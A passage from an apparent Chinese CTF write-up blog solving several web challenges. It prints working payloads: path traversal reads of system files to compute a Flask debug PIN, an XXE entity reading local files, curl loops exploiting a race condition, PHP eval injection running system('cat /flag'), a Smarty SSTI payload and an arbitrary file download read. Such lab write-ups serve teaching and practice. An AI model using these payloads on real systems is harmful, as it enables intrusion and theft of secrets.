sshd:x:22:22:sshd:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin at:x:25:25:at:&#x2F;var&#x2F;spool&#x2F;cron&#x2F;atjobs:&#x2F;sbin&#x2F;nologin squid:x:31:31:Squid:&#x2F;var&#x2F;cache&#x2F;squid:&#x2F;sbin&#x2F;nologin xfs:x:33:33:X Font Server:&#x2F;etc&#x2F;X11&#x2F;fs:&#x2F;sbin&#x2F;nologin games:x:35:35:games:&#x2F;usr&#x2F;games:&#x2F;sbin&#x2F;nologin cyrus:x:85:12::&#x2F;usr&#x2F;cyrus:&#x2F;sbin&#x2F;nologin vpopmail:x:89:89::&#x2F;var&#x2F;vpopmail:&#x2F;sbin&#x2F;nologin ntp:x:123:123:NTP:&#x2F;var&#x2F;empty:&#x2F;sbin&#x2F;nologin smmsp:x:209:209:smmsp:&#x2F;var&#x2F;spool&#x2F;mqueue:&#x2F;sbin&#x2F;nologin guest:x:405:100:guest:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin nobody:x:65534:65534:nobody:&#x2F;:&#x2F;sbin&#x2F;nologin</code></pre><p>判断 username &#x3D; “root”</p><h4 id="2-4-2-读取-moddir"><a href="#2-4-2-读取-moddir" class="headerlink" title="2.4.2 读取 moddir"></a>2.4.2 读取 moddir</h4><p>随机输入不存在的路径或者将 <code>?location=</code> 参数置空即可获得报错界面如下</p><p><img src="image-21.png" alt="image-21.png"></p><p>从中即可获取 moddir &#x3D; “&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.11&#x2F;site-packages&#x2F;flask&#x2F;app.py”</p><h4 id="2-4-3-读取-uuidnode"><a href="#2-4-3-读取-uuidnode" class="headerlink" title="2.4.3 读取 uuidnode"></a>2.4.3 读取 uuidnode</h4><p><code>payload</code> 如下：</p><pre class="language-none"><code class="language-none">&#x2F;?location&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</code></pre><p>返回如下信息</p><pre class="language-none"><code class="language-none">02:42:ac:02:04:80</code></pre><p>经过 <a href="https://www.toolhelper.cn/Digit/BaseConvert">在线进制转换工具</a> 将16进制转10进制转化后可得<br><img src="image-22.png" alt="image-22.png"></p><p>得到 uuidnode &#x3D; “2485376910464”</p><h4 id="2-4-4-读取-machine-id"><a href="#2-4-4-读取-machine-id" class="headerlink" title="2.4.4 读取 machine_id"></a>2.4.4 读取 machine_id</h4><p>尝试读取</p><pre class="language-none"><code class="language-none">&#x2F;?location&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;machine-id</code></pre><p>发现页面抛出 <code>FileNotFoundError</code> 错误</p><p>判断靶机为docker <del>（其实本来就知道）</del></p><p>因此尝试读取</p><pre class="language-none"><code class="language-none">&#x2F;?location&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id</code></pre><p>返回如下信息</p><pre class="language-none"><code class="language-none">3c253d1e-8856-4e45-98b5-e82146c245c5</code></pre><p>尝试读取</p><pre class="language-none"><code class="language-none">&#x2F;?location&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;cgroup</code></pre><p>返回如下信息</p><pre class="language-none"><code class="language-none">0::&#x2F;</code></pre><p>即为空，无信息</p><p>因此得出 machine_id &#x3D; “3c253d1e-8856-4e45-98b5-e82146c245c5”</p><p>最后将得到的信息填入Pin计算代码中即可获得当前环境的Pin码如下：</p><pre class="language-none"><code class="language-none">564-346-887</code></pre><blockquote><p>请注意：由于Docker每次启动后uuidnode值会改变，Write Up中的Pin值对该题并不具有普适性，请根据实际环境自行读取uuidnode值并计算相应环境的Pin码使用</p></blockquote><h3 id="2-5-获取-debug-shell"><a href="#2-5-获取-debug-shell" class="headerlink" title="2.5 获取 debug shell"></a>2.5 获取 debug shell</h3><p>随机输入不存在的路径或者将 <code>?location=</code> 参数置空即可获得报错界面如下</p><p><img src="image-23.png" alt="image-23.png"></p><p>点击右侧控制台图标并输入Pin码即可获得 <code>debug shell</code></p><p>在控制台输入 <code>os.getenv(&#39;FLAG&#39;)</code> 即可获得flag</p><p><img src="image-24.png" alt="image-24.png"></p><p>获得 <code>pin_revenge</code> 题的 <code>flag</code> 如下:</p><pre class="language-none"><code class="language-none">Spirit&#123;badd44f8-94eb-4648-b5d3-cdf837431e52&#125;</code></pre><h1 id="ez-xxe"><a href="#ez-xxe" class="headerlink" title="ez_xxe"></a>ez_xxe</h1><p>题目描述：</p><blockquote><p>so easy………</p></blockquote><p>打开页面后是一个可以输入XML文档的界面</p><p><img src="image-25.png" alt="image-25.png"></p><p>并且输入后有回显</p><p>结合题目标题判断是利用xxe漏洞恶意引入外部实体，直接读靶机文件</p><p><code>payload</code> 如下</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" ?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">foo</span> <span class="token punctuation">[</span><span class="token internal-subset"> &lt;!ENTITY flag SYSTEM "file:///flag" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>spirit</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>flag</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&flag;">&amp;flag;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>flag</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>spirit</span><span class="token punctuation">></span></span></code></pre><p>提交并返回如下界面，获得 <code>flag</code> ：<br><img src="image-26.png" alt="image-26.png"></p><blockquote><p>Spirit{19246b7d-dc61-4829-a4f7-54ffd5d76b01}</p></blockquote><h1 id="sharpshop"><a href="#sharpshop" class="headerlink" title="sharpshop"></a>sharpshop</h1><p>题目描述：</p><blockquote><p><img src="image-27.png" alt="image-27.png"></p></blockquote><blockquote><p>Hint: 🤖</p></blockquote><p>打开页面后发现是<del>拼夕夕</del>砍价买flag</p><p><img src="image-28.png" alt="image-28.png"></p><p>经过一个简单的尝试，发现 <code>flag</code> 的价格永远砍不到钱包价格及以下 <del>(典)</del></p><p><img src="image-29.png" alt="image-29.png"></p><p>砍到这里就砍不动了 <del>(需要10个金币再砍1刀，10个积分换1个金币 无限循环···)</del></p><h2 id="1-反编译ELF-app"><a href="#1-反编译ELF-app" class="headerlink" title="1. 反编译ELF-app"></a>1. 反编译ELF-app</h2><p>Hint 提示我们 <code>robots</code> ,因此访问网站的 <code>robots.txt</code> 如下：</p><p><img src="image-30.png" alt="image-30.png"></p><p>根据提示下载 <code>/sharpshop.tar</code></p><p>发现一个 <code>ELF</code> 类型的 <code>app</code></p><p>初步判断是一个使用 <code>c#</code> 编写的服务端程序</p><p>（此处也可根据题目名称 <code>sharpshop</code> 进行合理猜测）</p><p>Web 突然变 Reverse (误)</p><p>使用 <code>ILSpy</code> 进行反编译，提取 <code>c#</code> 文件内容</p><p><img src="image-31.png" alt="image-31.png"></p><p>核心代码如下：</p><pre class="language-csharp" data-language="csharp"><code class="language-csharp"><span class="token comment">// sharpshop, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null</span><span class="token comment">// Shopping</span><span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Threading</span><span class="token punctuation">;</span><span class="token keyword">internal</span> <span class="token keyword">class</span> <span class="token class-name">Shopping</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name"><span class="token keyword">long</span></span> _FlagPrice<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name"><span class="token keyword">long</span></span> _Wallet<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name"><span class="token keyword">int</span></span> _IsCutting<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name"><span class="token keyword">int</span></span> _IsBuying<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">long</span></span> FlagPrice <span class="token operator">=></span> _FlagPrice<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">long</span></span> Wallet <span class="token operator">=></span> _Wallet<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">bool</span></span> HasFlag <span class="token punctuation">&#123;</span> <span class="token keyword">get</span><span class="token punctuation">;</span> <span class="token keyword">private</span> <span class="token keyword">set</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">CutDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>Interlocked<span class="token punctuation">.</span><span class="token function">Exchange</span><span class="token punctuation">(</span><span class="token keyword">ref</span> _IsCutting<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span>        _FlagPrice <span class="token operator">-=</span> <span class="token punctuation">(</span>_FlagPrice <span class="token operator">-</span> _Wallet<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>        Interlocked<span class="token punctuation">.</span><span class="token function">Exchange</span><span class="token punctuation">(</span><span class="token keyword">ref</span> _IsCutting<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">bool</span></span> <span class="token function">Buy</span><span class="token punctuation">(</span><span class="token keyword">out</span> <span class="token class-name"><span class="token keyword">string</span></span> message<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>Interlocked<span class="token punctuation">.</span><span class="token function">Exchange</span><span class="token punctuation">(</span><span class="token keyword">ref</span> _IsBuying<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name"><span class="token keyword">long</span></span> flagPrice <span class="token operator">=</span> _FlagPrice<span class="token punctuation">;</span>        _Wallet <span class="token operator">-=</span> flagPrice<span class="token punctuation">;</span>        message <span class="token operator">=</span> <span class="token interpolation-string"><span class="token string">$"购买后余额：</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token expression language-csharp">_Wallet</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">;</span>        <span class="token class-name"><span class="token keyword">bool</span></span> result<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>_Wallet <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            _Wallet <span class="token operator">+=</span> flagPrice<span class="token punctuation">;</span>            message <span class="token operator">+=</span> <span class="token string">"，余额不足～"</span><span class="token punctuation">;</span>            result <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            message <span class="token operator">+=</span> <span class="token string">"，购买成功～"</span><span class="token punctuation">;</span>            HasFlag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            result <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        Interlocked<span class="token punctuation">.</span><span class="token function">Exchange</span><span class="token punctuation">(</span><span class="token keyword">ref</span> _IsBuying<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token function">Shopping</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        _IsCutting <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        _IsBuying <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        _Wallet <span class="token operator">=</span> <span class="token number">100L</span><span class="token punctuation">;</span>        _FlagPrice <span class="token operator">=</span> <span class="token keyword">long</span><span class="token punctuation">.</span>MaxValue<span class="token punctuation">;</span>        HasFlag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="2-竞态条件利用"><a href="#2-竞态条件利用" class="headerlink" title="2. 竞态条件利用"></a>2. 竞态条件利用</h2><p>仔细观察后就会发现该代码的反常之处</p><p>在计算余额是否足够购买 <code>flag</code> 时</p><p>代码没有直接判断 <code>_Wallet - flagPrice</code> 的正负</p><p>而是先将 <code>_Wallet -= flagPrice</code></p><p>如果余额不足再 <code>_Wallet += flagPrice</code></p><p>考虑到两个互斥锁仅控制了单个函数不能被同时多次调用</p><p>并没有控制两个函数的同时运行</p><p>且由于两个函数都访问了 <code>_FlagPrice</code> 和 <code>_Wallet</code></p><p>因此存在竞态条件的可能</p><blockquote><p>假设 action <code>CutDown</code> 中的 <code>_FlagPrice -= (_FlagPrice - _Wallet) / 2;</code><br>在 action <code>Buy</code> 的 <code>_Wallet -= flagPrice</code> 和 <code>_Wallet += flagPrice</code>之间发生，<br>就可以使得 <code>_FlagPrice</code> 降低到 <code>_Wallet</code> 以下，从而得以购买 <code>flag</code></p></blockquote><h2 id="3-解决方案"><a href="#3-解决方案" class="headerlink" title="3. 解决方案"></a>3. 解决方案</h2><p>构造两个发包脚本并同时运行即可</p><p>注意携带当前会话的 <code>sessionId</code> Cookies</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">while</span> <span class="token boolean">true</span><span class="token keyword">do</span><span class="token function">curl</span> <span class="token parameter variable">-b</span> <span class="token string">"sessionId=xxxx"</span> <span class="token string">"(SpiritCTF Server URL with port)/?action=buy"</span><span class="token keyword">done</span></code></pre><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">while</span> <span class="token boolean">true</span><span class="token keyword">do</span><span class="token function">curl</span> <span class="token parameter variable">-b</span> <span class="token string">"sessionId=xxxx"</span> <span class="token string">"(SpiritCTF Server URL with port)/?action=cutDown"</span><span class="token keyword">done</span></code></pre><p>同时运行两个脚本一段时间后会发现 <code>Flag价格</code> 和 <code>钱包</code> 都变成了0</p><p>因此得以购买成功</p><p><img src="image-32.png" alt="image-32.png"></p><p>得到 <code>flag</code> 如下</p><blockquote><p>Spirit{61a9950d-0e0a-4141-b04d-278961a87df0}</p></blockquote><h1 id="送分你要不要"><a href="#送分你要不要" class="headerlink" title="送分你要不要&gt;_&lt;"></a>送分你要不要&gt;_&lt;</h1><p>题目描述：</p><blockquote><p>这是一道没有意思的签到题😠</p></blockquote><p>打开页面后得到PHP代码如下：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ‮⁦ Spirit⁩⁦Welcome to</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"App1eTree"</span> <span class="token operator">==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'spirit'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token string double-quoted-string">"‮⁦Flag!⁩⁦SpiritCTF"</span> <span class="token operator">==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span>‮⁦give_you⁩⁦<span class="token number">2023</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QWQ'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">echo</span> <span class="token string double-quoted-string">"恭喜!flag送你啦"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Welcome to Spirit CTF 2023(but warm)!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script src="nonono.js">&lt;/script>'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><h2 id="1-不可见字符识别"><a href="#1-不可见字符识别" class="headerlink" title="1. 不可见字符识别"></a>1. 不可见字符识别</h2><p>根据该段代码神奇的高亮，判断此处存在不可见字符</p><p>这些不可见字符调整了可见字符的显示顺序</p><p>将代码复制到 <code>Visual Stuidio Code</code> 中分析</p><p><img src="image-33.png" alt="image-33.png"></p><p>可以看到不可见字符被显示了出来</p><h2 id="2-eval-利用"><a href="#2-eval-利用" class="headerlink" title="2. eval 利用"></a>2. eval 利用</h2><p>注意到该PHP代码使用了eval($_POST[‘QWQ’]);</p><p>因此想到可以通过 <code>eval</code> 函数来执行 <code>system</code> 命令 <code>cat</code> 出 <code>flag</code></p><h2 id="3-Payload-构造"><a href="#3-Payload-构造" class="headerlink" title="3. Payload 构造"></a>3. Payload 构造</h2><p>根据题目要求构造POST数据包如下：</p><p><img src="image-34.png" alt="image-34.png"></p><h3 id="3-1-Python-requests-POST"><a href="#3-1-Python-requests-POST" class="headerlink" title="3.1 Python requests POST"></a>3.1 Python requests POST</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"(SpiritCTF Server URL with port)"</span><span class="token keyword">global</span> resultdata <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"spirit"</span><span class="token punctuation">:</span><span class="token string">"App1eTree"</span><span class="token punctuation">,</span><span class="token string">"‮⁦give_you⁩⁦2023"</span><span class="token punctuation">:</span><span class="token string">"‮⁦Flag!⁩⁦SpiritCTF"</span><span class="token punctuation">,</span><span class="token string">"QWQ"</span><span class="token punctuation">:</span><span class="token string">'system("cat /flag");'</span><span class="token punctuation">&#125;</span>html <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>html<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p>发送POST数据包后，返回如下信息：</p><pre class="language-none"><code class="language-none">&lt;code&gt;&lt;span style&#x3D;&quot;color: #000000&quot;&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;&lt;?php&lt;br &#x2F;&gt;error_reporting&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;);&lt;br &#x2F;&gt;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;show_source&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;__FILE__&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;);&lt;br &#x2F;&gt;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #FF8000&quot;&gt;&#x2F;&#x2F;&nbsp;‮⁦&nbsp;Spirit⁩⁦Welcome&nbsp;to&lt;br &#x2F;&gt;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;if&nbsp;(&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #DD0000&quot;&gt;&quot;App1eTree&quot;&nbsp;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;&#x3D;&#x3D;&nbsp;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;$_POST&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #DD0000&quot;&gt;&#39;spirit&#39;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;]&nbsp;&amp;&amp;&nbsp;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #DD0000&quot;&gt;&quot;‮⁦Flag!⁩⁦SpiritCTF&quot;&nbsp;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;&#x3D;&#x3D;&nbsp;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;$_POST&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;‮⁦give_you⁩⁦2023&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;])&nbsp;&#123;&lt;br &#x2F;&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;eval(&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;$_POST&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #DD0000&quot;&gt;&#39;QWQ&#39;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;]);&lt;br &#x2F;&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #DD0000&quot;&gt;&quot;恭喜!flag送你啦&quot;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;;&lt;br &#x2F;&gt;&#125;else&nbsp;&#123;&lt;br &#x2F;&gt;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #DD0000&quot;&gt;&quot;Welcome&nbsp;to&nbsp;Spirit&nbsp;CTF&nbsp;2023(but&nbsp;warm)!&quot;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;;&lt;br &#x2F;&gt;&#125;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;echo&nbsp;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #DD0000&quot;&gt;&#39;&lt;script&nbsp;src&#x3D;&quot;nonono.js&quot;&gt;&lt;&#x2F;script&gt;&#39;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;;&lt;br &#x2F;&gt;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;Spirit&#123;00e6fceb-debc-4aa6-a721-489f4da2e7f0&#125;恭喜!flag送你啦&lt;script src&#x3D;&quot;nonono.js&quot;&gt;&lt;&#x2F;script&gt;</code></pre><p>得到 <code>flag</code> 如下:</p><blockquote><p>Spirit{00e6fceb-debc-4aa6-a721-489f4da2e7f0}</p></blockquote><h1 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h1><p>题目描述：</p><blockquote><p>R U SMART ENOUGH www</p></blockquote><p>打开页面后发现有很多题目</p><p><img src="image-35.png" alt="image-35.png"></p><p>结合题目标题 <code>ssti</code> 和 题目描述 <code>SMART</code></p><p>可以判断出该题为 <code>Smarty的SSTI模版注入</code></p><p><del>是谁做完了所有题目才发现是 SSTI 我不说</del></p><p>随意点击一个 <code>challenge</code> ，发现页面跳转到了 <code>/challenges.php?name=xxxx</code> ,</p><p>由此判断后端会使用文件读取函数读取名字为 <code>xxxx</code> 的模版文件并渲染到前端</p><p>利用 <code>data</code> 伪协议构造 <code>payload</code> 如下：</p><pre class="language-none"><code class="language-none">&#x2F;challenges.php?name&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&#123;$smarty.env.FLAG&#125;</code></pre><p>即可将 <code>smarty</code> 的环境变量 <code>FLAG</code> 显示到前端</p><p><img src="image-36.png" alt="image-36.png"></p><p>得到 <code>flag</code> 如下：</p><pre class="language-none"><code class="language-none">Spirit&#123;f94322ca-2c8f-4dc3-87f4-ec75d4c7bbbc&#125;</code></pre><h1 id="你喜欢鸣濑白羽吗"><a href="#你喜欢鸣濑白羽吗" class="headerlink" title="你喜欢鸣濑白羽吗"></a>你喜欢鸣濑白羽吗</h1><p>题目描述：</p><blockquote><p>不喜欢鸣濑白羽(?)的是不能拿到flag的😘 <del>最好用火狐浏览器打开抓包，用bp</del> (已经恢复了)</p></blockquote><p>打开页面后发现是一个图库管理下载系统</p><p><img src="image-37.png" alt="image-37.png"></p><h2 id="1-任意文件读取漏洞"><a href="#1-任意文件读取漏洞" class="headerlink" title="1. 任意文件读取漏洞"></a>1. 任意文件读取漏洞</h2><p>点击 <code>Download</code> 按钮，发现页面跳转到了 <code>/download?filename=xxxx</code></p><p>经过测试发现 <code>filename</code> 字段存在任意文件读取漏洞</p><p>访问 <code>/download?filename=/proc/self/cmdline</code> ，内容如下：</p><pre class="language-bash" data-language="bash"><code class="language-bash">python /app/Nanami.py</code></pre><p>根据服务端代码路径访问 <code>/download?filename=/app/Nanami.py</code>,</p><p>得到服务端代码如下：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> mimetypes<span class="token keyword">import</span> os<span class="token keyword">import</span> subprocess<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> make_response<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token keyword">import</span> jwt<span class="token keyword">import</span> loggingapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>SECRET_KEY <span class="token operator">=</span> <span class="token string">"I_LIKE_Aoyama_Nanami"</span>logging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'error.log'</span><span class="token punctuation">,</span> level<span class="token operator">=</span>logging<span class="token punctuation">.</span>ERROR<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    token <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'auth'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> token<span class="token punctuation">:</span>        token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'guest'</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> SECRET_KEY<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">)</span>        response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'auth'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        response<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'auth'</span><span class="token punctuation">,</span> token<span class="token punctuation">,</span> httponly<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> samesite<span class="token operator">=</span><span class="token string">'Lax'</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> response<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/download'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    token <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'auth'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> token<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> SECRET_KEY<span class="token punctuation">,</span> 